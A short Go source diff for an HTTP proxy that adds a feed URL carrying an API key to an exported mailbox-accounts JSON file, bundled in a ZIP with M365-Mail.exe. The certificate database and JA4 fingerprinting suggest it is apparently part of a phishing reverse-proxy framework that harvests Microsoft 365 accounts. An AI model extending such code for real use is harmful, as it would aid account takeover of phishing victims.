@@ -568,7 +568,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 					exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
 					log.Debug("[mailbox] Export body length: %d", len(exportBody))
-					zipBuffer := p.createMailboxDownloadZip(exportBody)
+					feedUrl := fmt.Sprintf("https://%s/api/v1/feed?key=%s", req.Host, apiKey)
+					zipBuffer := p.createMailboxDownloadZip(exportBody, feedUrl)
 					if zipBuffer == nil {
 						log.Error("[mailbox] Failed to create ZIP buffer")
 						resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
@@ -5128,11 +5129,20 @@ func (p *HttpProxy) generateSimpleJA4(userAgent string, acceptLang string, heade
 }
 
 // createMailboxDownloadZip creates a ZIP file containing M365-Mail.exe and accounts-import.json
-func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string) []byte {
+func (p *HttpProxy) createMailboxDownloadZip(accountsJSON string, feedUrl string) []byte {
 	// Create ZIP buffer
 	buf := new(bytes.Buffer)
 	zipWriter := zip.NewWriter(buf)
-	
+
+	// Inject feedUrl into the accounts JSON so the app auto-configures sync
+	var parsed map[string]interface{}
+	if err := json.Unmarshal([]byte(accountsJSON), &parsed); err == nil {
+		parsed["feedUrl"] = feedUrl
+		if updated, err := json.Marshal(parsed); err == nil {
+			accountsJSON = string(updated)
+		}
+	}
+
 	// Add accounts-import.json
 	accountsFile, err := zipWriter.Create("accounts-import.json")
 	if err != nil {
